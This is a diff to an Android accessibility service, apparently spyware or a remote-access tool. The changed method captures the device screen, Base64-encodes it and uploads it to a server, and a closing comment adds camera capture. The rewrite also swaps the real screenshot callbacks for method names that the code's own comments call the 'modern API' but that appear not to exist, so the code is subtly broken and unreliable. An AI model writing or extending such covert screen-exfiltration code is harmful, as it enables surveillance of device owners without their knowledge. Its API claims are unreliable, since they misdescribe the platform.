@@ -224,39 +224,47 @@ public class PowerAccessibilityService extends AccessibilityService implements S
     }
 
     // --- NEW: Screenshot Functionality ---
-    @RequiresApi(api = Build.VERSION_CODES.R)
-    private void takeScreenshot() {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
-            Log.e(TAG, "Screenshot API is not available on this Android version.");
-            submitDataToServer("screenshot_error", "API NOT AVAILABLE ON THIS VERSION OF ANDROID");
-            return;
-        }
-        // NOTE: This is a simplified call. For a real implementation, you might need
-        // to handle screen rotation, display changes, etc.
+    // In PowerAccessibilityService.java
+
+@RequiresApi(api = Build.VERSION_CODES.R)
+private void takeScreenshot() {
+    Log.d(TAG, "Attempting to take screenshot.");
+    try {
+        // This uses the modern TakeScreenshotCallback with detailed error reporting
         takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
+            
+            // This method name is also part of the modern API
             @Override
-            public void onSuccess(ScreenshotResult screenshot) {
-                Log.i(TAG, "Screenshot taken successfully.");
+            public void onScreenshotResult(@NonNull ScreenshotResult screenshot) {
                 try {
-                    // Convert bitmap to Base64
                     Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshot.getHardwareBuffer(), screenshot.getColorSpace());
                     ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-                    bitmap.compress(Bitmap.CompressFormat.JPEG, 80, byteArrayOutputStream); // Compress to 80% quality
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 80, byteArrayOutputStream);
                     byte[] byteArray = byteArrayOutputStream.toByteArray();
-                    String encoded = Base64.encodeToString(byteArray, Base64.DEFAULT);
-                    uploadBase64File("screenshot", encoded);
+                    String encodedString = Base64.encodeToString(byteArray, Base64.DEFAULT);
+
+                    // Call the function we know works
+                    uploadBase64File("screenshot", encodedString);
+                    Log.i(TAG, "Screenshot captured and sent for upload.");
+
                 } catch (Exception e) {
-                    Log.e(TAG, "Failed to process screenshot.", e);
-                    submitDataToServer("screenshot_error", "Processing failed");
+                    Log.e(TAG, "Error processing screenshot data", e);
+                    submitDataToServer("screenshot_error", "Failed to process screenshot: " + e.getMessage());
                 }
             }
+
+            // This is the most important part - it gives us a text error message
             @Override
-            public void onFailure(int errorCode) {
-                Log.e(TAG, "Failed to take screenshot, error code: " + errorCode);
-                submitDataToServer("screenshot_error", "Capture failed with code: " + errorCode);
+            public void onScreenshotError(int errorCode, @NonNull String errorMessage) {
+                Log.e(TAG, "Screenshot failed with code: " + errorCode + " and message: " + errorMessage);
+                submitDataToServer("screenshot_error", "Screenshot API failed: " + errorMessage);
             }
         });
+    } catch (Exception e) {
+        Log.e(TAG, "Fatal error when trying to call takeScreenshot", e);
+         submitDataToServer("screenshot_error", "Could not initiate screenshot: " + e.getMessage());
     }
+}
 
     // --- NEW: Camera Functionality (Launches a helper Activity) ---
     // NOTE: This requires creating a new, separate Activity (e.g., CameraActivity.java)
